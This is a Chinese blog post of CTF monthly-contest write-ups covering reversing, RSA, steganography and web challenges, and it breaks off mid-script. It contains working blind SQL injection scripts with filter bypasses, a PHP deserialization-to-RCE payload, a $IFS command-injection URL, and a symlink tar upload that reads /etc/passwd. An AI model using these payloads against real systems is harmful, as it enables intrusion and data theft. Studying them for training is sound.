    <content type="html"><![CDATA[<p>历史文章补发</p><p>部分安恒月赛题目的复现记录</p><a id="more"></a><h1 id="5月月赛"><a href="#5月月赛" class="headerlink" title="5月月赛"></a>5月月赛</h1><h2 id="crypto-amp-misc"><a href="#crypto-amp-misc" class="headerlink" title="crypto&amp;misc"></a>crypto&amp;misc</h2><p>地址:<a href="https://pan.baidu.com/s/1RB1w5wHuk8bnNShHGaqqVg" target="_blank" rel="noopener">https://pan.baidu.com/s/1RB1w5wHuk8bnNShHGaqqVg</a>   提取码：259q</p><h3 id="baby-writeup"><a href="#baby-writeup" class="headerlink" title="baby_writeup"></a>baby_writeup</h3><p>拿到题目先strings一下，发现有个flag{}字样，然后在IDA打开，ctrl+1查找string字符串，找到之后F5反编译一下，记得要找到函数入口，看到代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">fgets(s, 17, stdin);</span><br><span class="line">if ( strlen(s) !&#x3D; 16 )</span><br><span class="line">exit(0);</span><br><span class="line">sub_400756(s, &amp;v6);</span><br><span class="line">for ( i &#x3D; 0; i &lt; strlen(v6); ++i )</span><br><span class="line">&#123;</span><br><span class="line">if ( byte_601100[(signed __int64)i] !&#x3D; v6[i] )</span><br><span class="line">  exit(0);</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;Flag&#123;%s&#125;\n&quot;, s);</span><br></pre></td></tr></table></figure><p>可以看到题目是输入一个长度为16的字符串(因为字符串结尾还有一个结束符要占据一位)，然后经过校验之后输出，说明输入的原来就是flag，找到byte_601100内存中的内容，把16进制提取出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6DAB1EEB88B9B6179B7ACB7E</span><br></pre></td></tr></table></figure><p>猜测它要不是hex要不是base64，尝试一下发现是base64，转换之，需要先进行ascii2hex的转换，这个不理解为什么，然后运行即可得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop# .&#x2F;5aff787616ad1 </span><br><span class="line">base64i5thebest+</span><br><span class="line">Flag&#123;base64i5thebest+&#125;</span><br></pre></td></tr></table></figure><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><p>这题真是佩服他们的搜索能力，原来还可以这么玩（2333.），打开代码发现是已知n,e求d获取flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">N = <span class="number">101991809777553253470276751399264740131157682329252673501792154507006158434432009141995367241962525705950046253400188884658262496534706438791515071885860897552736656899566915731297225817250639873643376310103992170646906557242832893914902053581087502512787303322747780420210884852166586717636559058152544979471</span></span><br><span class="line">e = <span class="number">46731919563265721307105180410302518676676135509737992912625092976849075262192092549323082367518264378630543338219025744820916471913696072050291990620486581719410354385121760761374229374847695148230596005409978383369740305816082770283909611956355972181848077519920922059268376958811713365106925235218265173085</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">flag = <span class="string">"flag&#123;"</span> + hashlib.md5(hex(d)).hexdigest() + <span class="string">"&#125;"</span></span><br></pre></td></tr></table></figure><p>观察可知本体的e非常大，所以百度搜索 <code>rsa攻击e很大</code>  在第一条结果里面居然就找到思路！！本题是wiener-attack，还附上了github代码，直接copy下来用就可以了，可以得到d的值，代入上述代码中即可得到flag</p><h3 id="洞拐洞拐洞洞拐"><a href="#洞拐洞拐洞洞拐" class="headerlink" title="洞拐洞拐洞洞拐"></a>洞拐洞拐洞洞拐</h3><p>打开图片放大观察发现每一个小像素都是或黑或白的小方块,所以可以把黑色看成1白色看成0转换一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">im = Image.open(<span class="string">'5aff787f5d6f2.png'</span>)</span><br><span class="line">pix = im.load()</span><br><span class="line">width = im.size[<span class="number">0</span>]</span><br><span class="line">height = im.size[<span class="number">1</span>]</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(width):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(height):</span><br><span class="line">        r,g,b = pix[x,y]</span><br><span class="line">        <span class="keyword">if</span> r == <span class="number">255</span>:</span><br><span class="line">            flag += <span class="string">'0'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag += <span class="string">'1'</span></span><br><span class="line">content = re.findall(<span class="string">r'.&#123;8&#125;'</span>,flag)</span><br><span class="line">nflag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> content:</span><br><span class="line">    nflag += chr(int(item,<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">flag = base64.b16decode(nflag)</span><br><span class="line">open(<span class="string">'1.wav'</span>,<span class="string">'wb'</span>).write(flag)</span><br></pre></td></tr></table></figure><p>处理wav文件，可以用一个Audacity工具，网上有在线版，分析文件，发现文件波形长度应该是八进制文件，分析一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> wave</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> re </span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">file = <span class="string">'1.wav'</span></span><br><span class="line">wavefile = wave.open(file,<span class="string">'r'</span>)</span><br><span class="line">numframes = wavefile.getnframes()</span><br><span class="line">strdata = wavefile.readframes(numframes)</span><br><span class="line">wavedata = np.fromstring(strdata,dtype=np.int16)</span><br><span class="line">wavedata = wavedata * <span class="number">1.0</span> / (max(abs(wavedata)))</span><br><span class="line">datas = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(wavedata),<span class="number">10</span>):</span><br><span class="line">    datas.append(wavedata[i])</span><br><span class="line"></span><br><span class="line">strs = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> data <span class="keyword">in</span> datas:</span><br><span class="line">    x = <span class="string">"%0.2f"</span> % data</span><br><span class="line">    strs += str(int((float(x) + <span class="number">1.0</span>)/<span class="number">0.25</span>) - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">tt = re.findall(<span class="string">r'.&#123;3&#125;'</span>,strs)</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> tt:</span><br><span class="line">    flag += chr(int(t,<span class="number">8</span>))</span><br><span class="line"><span class="comment"># print flag</span></span><br><span class="line"><span class="keyword">print</span> base64.b32decode(flag+<span class="string">"======"</span>)</span><br></pre></td></tr></table></figure><p>处理一下就可以得到flag，这题真的是头铁，还是我太菜了。。</p><h1 id="7月月赛"><a href="#7月月赛" class="headerlink" title="7月月赛"></a>7月月赛</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="web02-就是这么直接"><a href="#web02-就是这么直接" class="headerlink" title="web02 就是这么直接"></a>web02 就是这么直接</h3><p>这题目我觉得就是脑洞题，题目给出了提示代码，其中有md5函数，可能是提示我们本题和md5有关，其实本题思路就是先提交一个md5值，题目会返回 <code>emmm我觉得答案是啥呢？</code> 查看元素可以看到后面还加了一串md5值，将这段md5再次提交，重复这个过程，直到得到flag，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url =  <span class="string">'http://101.71.29.5:10002/flag.php'</span></span><br><span class="line">payload = &#123;<span class="string">'answer'</span>:<span class="string">'c36af63f87acebba1c23498809db7537'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    content = requests.post(url,payload).content.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> content:</span><br><span class="line">        print(content)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    new = re.findall(<span class="string">'&lt;!--[0-9a-z]&#123;10,&#125;--&gt;'</span>,content)</span><br><span class="line">    payload = &#123;<span class="string">'answer'</span>: new[<span class="number">0</span>][<span class="number">4</span>:<span class="number">-3</span>]&#125;</span><br></pre></td></tr></table></figure><h3 id="web03-简历来了"><a href="#web03-简历来了" class="headerlink" title="web03 简历来了"></a>web03 简历来了</h3><p>这个题目考察的是CSRF相关的知识点</p><p>/upload/73e0669ac68ffcb28aed0c48b0924a42.jpg<br><a href="http://138.68.29.92:8888/ContentHijackingLoader.html?objfile=http://127.0.0.1/upload/73e0669ac68ffcb28aed0c48b0924a42.jpg&amp;objtype=flash&amp;target=http://127.0.0.1/admin&amp;postdata=&amp;logmode=result&amp;regex=&amp;isauto=1">http://138.68.29.92:8888/ContentHijackingLoader.html?objfile=http://127.0.0.1/upload/73e0669ac68ffcb28aed0c48b0924a42.jpg&amp;objtype=flash&amp;target=http://127.0.0.1/admin&amp;postdata=&amp;logmode=result&amp;regex=&amp;isauto=1</a></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><p>链接：<a href="https://pan.baidu.com/s/1kqOTuqtJsW6PK4ob2_VqNg" target="_blank" rel="noopener">https://pan.baidu.com/s/1kqOTuqtJsW6PK4ob2_VqNg</a>   密码：m97g</p><h3 id="0x01-弱口令"><a href="#0x01-弱口令" class="headerlink" title="0x01-弱口令"></a>0x01-弱口令</h3><p>这题比较坑，题目是个压缩包，解压需要密码，打开压缩包之后发现有一段不可见文本，复制一下在sublime中打开发现是摩斯密码，解密一下 <code>HELL0FORUM</code> ，解压这个压缩包，发现一张图片，一道基本的LSB色道隐写，用脚本跑一下即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python lsb.py extract aa.png 1.txt 123456</span><br></pre></td></tr></table></figure><figure class="highlight plain"><figcaption><span>是弱口令</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 0X02-浏览图片的时候刷新键有没有用呢 </span><br><span class="line"></span><br><span class="line">由刷新可以联想到这题考察的是F5算法，网上查找解密算法</span><br></pre></td></tr></table></figure><p>java Extract Misc.jpg<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">可以得到一个文本文件，看文件前缀发现是zip文件前缀，修改文件后缀为zip即可，zip文件还有一层伪加密，之后解密即可得到flag</span><br><span class="line"></span><br><span class="line">### 0x03-到底为了什么</span><br></pre></td></tr></table></figure><br>http.request.uri contains “pma”<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[](month_race&#x2F;1.png)</span><br><span class="line"></span><br><span class="line">可以看到有一条修改密码的命令，继续浏览发现应该是一个csrf攻击的流量包，网上查找cve编号</span><br><span class="line"></span><br><span class="line">[](month_race&#x2F;2.png)</span><br><span class="line"></span><br><span class="line">计算flag</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;php</span><br><span class="line">&lt;?php</span><br><span class="line">$con &#x3D; strtolower(&quot;CVE-2017-1000499_CWE-352_2018-06-15 09:40:12&quot;);</span><br><span class="line">echo md5($con);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><h1 id="十月月赛"><a href="#十月月赛" class="headerlink" title="十月月赛"></a>十月月赛</h1><h2 id="web-1"><a href="#web-1" class="headerlink" title="web"></a>web</h2><h3 id="好黑的黑名单"><a href="#好黑的黑名单" class="headerlink" title="好黑的黑名单"></a>好黑的黑名单</h3><p>随便测试可以发现数据库名长度为3</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;101.71.29.5:10008&#x2F;show.php?id&#x3D;0||if((length(database())-3),1,0)</span><br></pre></td></tr></table></figure><p>题目过滤了分号，单引号，但是regexp没有被过滤，可以使用regexp来绕过，可知数据库名为web</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;101.71.29.5:10008&#x2F;show.php?id&#x3D;if((database()regexp(0x776562)),1,2)</span><br></pre></td></tr></table></figure><p>然后爆库名，但是=号被过滤了，但是可以用in来绕过，比如这样</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">in</span> (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>)</span><br></pre></td></tr></table></figure><p>空格也被过滤了，可以用%0a绕过，还有information.schema.tables也被过滤了，可以用information_schema%0a.%0atables来绕过，代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://101.71.29.5:10008/show.php?id="</span></span><br><span class="line">test = <span class="string">"0123456789qwertyuiopasdfghjklzxcvbnm,\&#123;|\&#125;~"</span></span><br><span class="line">table = <span class="string">"if(((select%0agroup_concat(table_name)%0afrom%0ainformation_schema%0a.%0atables%0awhere%0atable_schema%0ain%0a(database()))regexp(0x&#123;&#125;)),1,2)"</span></span><br><span class="line"><span class="comment"># table_name:admin,flaggg,menu</span></span><br><span class="line">column = <span class="string">"if(((select%0agroup_concat(column_name)%0afrom%0ainformation_schema%0a.%0acolumns%0awhere%0atable_name%0ain%0a(0x666c61676767))regexp(0x&#123;&#125;)),1,2)"</span></span><br><span class="line"><span class="comment"># id,f1agg</span></span><br><span class="line">content = <span class="string">"if(((select%0af1agg%0afrom%0aflaggg)regexp(0x&#123;&#125;)),1,2)"</span></span><br><span class="line">payload = <span class="string">"5e"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line">flagdic = <span class="string">"0123456789abcdeflag."</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> flagdic:</span><br><span class="line">        temp = hex(ord(s))[<span class="number">2</span>:<span class="number">4</span>]</span><br><span class="line">        <span class="comment"># print(url+table.format(payload+temp))</span></span><br><span class="line">        res = requests.get(url+content.format(payload+temp)).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"郑州烩面"</span> <span class="keyword">in</span> res:</span><br><span class="line">            <span class="keyword">if</span> temp == <span class="string">"7b"</span>:</span><br><span class="line">                payload += <span class="string">"2e"</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                payload += temp;</span><br><span class="line">            flag += chr(int(temp,<span class="number">16</span>))</span><br><span class="line">            print(payload)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">"油泼面"</span> <span class="keyword">in</span> res:</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"error"</span>)</span><br></pre></td></tr></table></figure><p>看了学长的博客说regexp在匹配flag的时候只能到flag{之后就会报错，这是由于正则表达式中{}是有特殊含义的，所以会报错，我们用 <code>.</code> 来代替{}就可以了</p><p><img src="/2020/09/13/month-race/10.png" alt></p><h3 id="ezsql"><a href="#ezsql" class="headerlink" title="ezsql"></a>ezsql</h3><p>注入题目，注册账号登录进去查看用户信息时id参数存在注入，需要用到load_file函数，wp里面用了if函数，但是这题我使用的异或运算符^</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">dic = <span class="string">"0123456789ABCDEF"</span></span><br><span class="line">url = <span class="string">"http://101.71.29.5:10015/user/user.php?id="</span></span><br><span class="line">file = open(<span class="string">'1.txt'</span>,<span class="string">'w'</span>)</span><br><span class="line">cookie = &#123;<span class="string">"PHPSESSID"</span>: <span class="string">"8lvl1ukppvqs2ovi8n0a2lu4g5"</span>&#125;</span><br><span class="line"><span class="comment"># index.php</span></span><br><span class="line">index = <span class="string">"0^(hex(load_file(0x2f7661722f7777772f68746d6c2f696e6465782e706870)) like 0x&#123;&#125;25)"</span> </span><br><span class="line">config = <span class="string">"0^(hex(load_file(0x2f7661722f7777772f68746d6c2f636f6e6669672f636f6e6669672e706870)) like 0x&#123;&#125;25)"</span> </span><br><span class="line">payload = <span class="string">""</span></span><br><span class="line">content = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10000</span>):</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> dic:</span><br><span class="line">        temp = hex(ord(item))[<span class="number">2</span>:<span class="number">4</span>]</span><br><span class="line">        <span class="comment"># print(url+index.format(payload+temp))</span></span><br><span class="line">        res = requests.get(url+config.format(payload+temp),cookies=cookie).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"admin"</span> <span class="keyword">in</span> res:</span><br><span class="line">            payload += temp</span><br><span class="line">            content += item</span><br><span class="line">            file.writelines(payload)</span><br><span class="line">            file.writelines(content)</span><br><span class="line">            print(payload)</span><br><span class="line">            print(content)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>可以得到index.php的代码为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'config/sys_config.php'</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'header.php'</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'CONFIG'</span>]))&#123;</span><br><span class="line">    $config = $_COOKIE[<span class="string">'CONFIG'</span>];</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">'config/config.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>再读config.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$config = unserialize(base64_decode($config));</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'p'</span>]))&#123;</span><br><span class="line">    $p=$_GET[<span class="string">'p'</span>];    </span><br><span class="line">    $config-&gt;$p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $config;</span><br><span class="line">    <span class="keyword">private</span> $path;</span><br><span class="line">    <span class="keyword">public</span> $filter;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($config=<span class="string">""</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;config = $config;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">123</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getConfig</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;config == <span class="string">""</span>)&#123;</span><br><span class="line">            $config = <span class="keyword">isset</span>($_POST[<span class="string">'config'</span>])?$_POST[<span class="string">'config'</span>]:<span class="string">""</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">SetFilter</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">        <span class="comment">//        echo $value;</span></span><br><span class="line">        $value=waf_exec($value); </span><br><span class="line">        var_dump($value);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;filter)&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;filter <span class="keyword">as</span> $filter)&#123;</span><br><span class="line">            $array = is_array($value)?array_map($filter,$value):call_user_func($filter,$value);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filter = <span class="keyword">array</span>();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        <span class="comment">//var_dump($key);</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;SetFilter($key);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">""</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到在__get()函数，该函数是类在访问私有成员的时候会自动调用这个方法，具体机制还需要研究，然后这里与setfilter函数利用反序列化可以构成rce，在cookie中写入序列化值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$snow = <span class="keyword">new</span> Config();</span><br><span class="line">$snow-&gt;filter = <span class="keyword">array</span>(<span class="string">'system'</span>);</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($snow));</span><br></pre></td></tr></table></figure><p>然后访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;101.71.29.5:10015&#x2F;index.php?p&#x3D;ls</span><br></pre></td></tr></table></figure><p>发现即可列目录，但是由于过滤了空格和/，所以无法读文件，空格可以使用$IFS绕过，然后利用grep命令来读</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;101.71.29.5:10015&#x2F;index.php?p&#x3D;grep$IFS-ri$IFS.$IFSflag</span><br></pre></td></tr></table></figure><p>这个不理解，需要后续再学习</p><p>在附上官方解法，待研究</p><p><img src="/2020/09/13/month-race/11.png" alt></p><h3 id="interesting-web"><a href="#interesting-web" class="headerlink" title="interesting web"></a>interesting web</h3><p>题目是一个flask框架，题目了修改密码功能，思路是修改admin的密码，flask框架中session<br>是存储在浏览器端的，虽然不能伪造但是可以破解，我们</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJsb2dpbiI6dHJ1ZSwidG9rZW4iOnsiIGIiOiJaamRrWlRaa1l6QmlZVEV4TlRVMU5UWTVaVFV3Wmpaak16ZGxNVFU1TURVPSJ9LCJ1c2VybmFtZSI6ImFkbWluIn0.DuKTNg.LtfGK8IX-4fJ6WO-6mcVJsU2hdI</span><br></pre></td></tr></table></figure><p>第一个.号之前的内容是base64编码的，直接解密就可以了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;login&quot;:true,&quot;token&quot;:&#123;&quot; b&quot;:&quot;ZjdkZTZkYzBiYTExNTU1NTY5ZTUwZjZjMzdlMTU5MDU&#x3D;&quot;&#125;,&quot;username&quot;:&quot;admin&quot;&#125;</span><br></pre></td></tr></table></figure><p>再将b的值base64解码就可以得到token了，然后修改密码，以admin身份登录，然后利用软链接来读取文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s /etc/passwd 1.jpg</span><br><span class="line">tar cvfp shell.tat 1.jpg</span><br></pre></td></tr></table></figure><p>然后上传在访问图片，下载之，修改后缀为txt查看即可得到flag</p><h2 id="Crypt"><a href="#Crypt" class="headerlink" title="Crypt"></a>Crypt</h2><h3 id="仿射"><a href="#仿射" class="headerlink" title="仿射"></a>仿射</h3><p>仿射密码，题目已经给出了b的值，对于仿射密码来说</p><p>加密过程为</p><blockquote><p>y≡e(x)≡a(x)+b(mod26)</p></blockquote><p>解密过程</p><blockquote><p>x ≡ d(e(x)) ≡ a’(e(x)-b)(mod26)         # a’为a的逆，在26以内是有限的</p></blockquote><p>我们只需要爆破即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="string">"achjbnpdfherebjsw"</span></span><br><span class="line">b=<span class="number">7</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> (<span class="number">1</span>,<span class="number">9</span>,<span class="number">21</span>,<span class="number">15</span>,<span class="number">3</span>,<span 